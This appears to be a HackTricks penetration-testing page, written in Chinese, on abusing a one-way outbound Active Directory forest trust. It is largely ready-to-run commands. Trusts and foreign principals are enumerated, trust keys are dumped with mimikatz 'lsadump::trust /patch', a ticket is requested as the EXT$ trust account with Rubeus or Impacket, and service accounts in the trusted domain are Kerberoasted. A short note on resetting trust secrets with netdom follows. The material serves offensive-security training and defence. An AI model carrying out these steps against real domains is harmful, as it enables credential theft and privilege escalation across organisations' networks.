# 外部林域 - 单向（出站）

{{#include ../../banners/hacktricks-training.md}}

在此场景中，**你的域**将某些**权限**授予来自**其他域/林**的主体。

## 枚举

### 出站信任
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
如果你可以使用 AD module，也可以直接检查 **Trusted Domain Object (TDO)**。这样可以获取原始的 LDAP-backed trust 数据，之后你需要根据这些数据判断应选择 **FSP/group abuse** 还是 **trust-account abuse** 这一更简单的路径：
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
你还应该枚举 `CN=ForeignSecurityPrincipals` 中的 foreign principals 实际被授予了哪些访问权限。常见的高价值权限包括：

- 当前 domain 中某台 server/DC 上的 **Local admin**
- 属于某个拥有针对 users/computers/GPOs 的 ACL 的 **custom domain group**
- 修改 **computer objects** 的权限；如果 trust configuration 允许，之后可能转化为 [RBCD](resource-based-constrained-delegation.md)

## Trust Account Attack

当从 domain/forest **B** 到 domain/forest **A** 创建单向 trust（**B trusts A**）时，会在 **A** 中为 **B** 创建一个 **trust account**。从 **A** 的 outbound-trust 视角来看，这很有用，因为如果你之后 compromise **B**（trusting side），就可以在那里 dump trust secret，并以 `B$` 身份 authenticate 回 **A**。<sup>[[1]](#references)</sup>

这里需要理解的关键点是，可以使用以下方式从 **trusting** domain 中的 Domain Controller 提取该 trust account 的 password 和 Kerberos material：<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
之所以可行，是因为在 **trusted** domain 中创建的 trust account 是一个已启用的 principal，最终会在该域中获得普通 domain user 的基线权限。这通常足以开始枚举 LDAP、请求 tickets，并寻找下一条提权路径。<sup>[[1]](#references)</sup>

在 `ext.local` 是 **trusting** domain、`root.local` 是 **trusted** domain 的场景中，会在 `root.local` 内创建一个名为 `EXT$` 的 user account。从 `ext.local` 中导出 trust keys 后，可以获得凭据，并以 `root.local\EXT$` 的身份对 `root.local` 使用这些凭据：<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
随后，使用提取出的 **RC4** 密钥在 `root.local` 内部以 `root.local\EXT$` 身份进行身份验证：<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
然后，以该 principal 的身份枚举受信任域，例如对 `root.local` 中的高价值 SPN 执行 Kerberoasting：<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 从 Linux

如果你恢复了 **RC4** trust-account key，也可以使用 Impacket 从 Linux 执行相同的操作：
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
如果 **RC4** 不被接受，则回退使用恢复的 **cleartext password**（或派生出的 **AES** keys），并从该 foothold 复用常规的 [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) 和 [Kerberoast](kerberoast.md) workflows。

### Key material gotchas

不要混淆 **trust keys** 和 **trust-account credentials**：<sup>[[1]](#references)</sup>

- 在单向 trust 中，双方都会存储一个 **TDO**，但实际的 **`EXT$` user account 只存在于 trusted domain 中**。
- 当前的 trust-account password 会反映在 TDO trust secret（`NewPassword` / current trust key）中。
- **RC4** trust key 是最容易复用于 `asktgt`、以 trust account 身份使用的 artifact；在默认设置中，这通常是可用的 enctype，因为 trust account 的 `msDS-SupportedEncryptionTypes` 通常为空。
- 如果你从 **AES trust keys** 的角度考虑，请记住它们不能与 trust-account AES keys 互换，因为 salts 不同。

因此，对于本页介绍的 technique，优先使用 dump 得到的 **RC4** material 或恢复的 **cleartext** password。<sup>[[1]](#references)</sup>

### Gathering cleartext trust password

在之前的流程中，使用的是 trust hash，而不是 **cleartext password**（该密码也会被 **mimikatz** dump）。<sup>[[1]](#references)</sup>

可以将 mimikatz 输出中的 \[ CLEAR ] 从 hexadecimal 转换，并移除 null bytes `\x00`，从而获得 cleartext password：<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: 可以将 mimikatz 输出中的 ( CLEAR ) 从 hexadecimal 转换，并移除 null bytes，从而获得 cleartext password...](<../../images/image (938).png>)

有时在创建 trust relationship 时，用户必须为该 trust 手动输入 password。在本演示中，该 key 是原始 trust password，因此是 human readable 的。随着 key rotation（默认：每 30 天一次），cleartext 通常会不再是 human readable 的，但从技术上讲仍然可用。<sup>[[1]](#references)</sup>

cleartext password 可用于以 trust account 身份执行常规 authentication，作为使用 trust account 的 Kerberos secret key 请求 TGT 的替代方案。这里从 `ext.local` 查询 `root.local` 中的 `Domain Admins` 成员：<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: cleartext password 可用于以 trust account 身份执行常规 authentication，作为请求 TGT 的替代方案...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts 是较为特殊的 principals。Interactive logons，例如 **RUNAS / console / RDP**，并不是这里预期的路径，而 **NTLM** authentication attempts 可能会失败并返回 `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`。因此应改用 **Kerberos network logons**（`asktgt`、LDAP、CIFS、Kerberoast）。<sup>[[1]](#references)</sup>

### Persistence / cleanup note

如果 defenders 意识到 trusting domain 已被 compromise，他们应使用 `netdom trust ... /resetOneSide ...` 在**双方**轮换 trust secret。从 operator 的角度来看，这一点很重要，因为**手动 reset 会立即使旧 trust material 失效**，而正常的 trust-password rotation 会在 rollover 期间保留 current/previous values。<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## 参考资料

- [1] [SID filter as security boundary between domains? (Part 7) – Trust account attack – from trusting to trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Resetting a trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
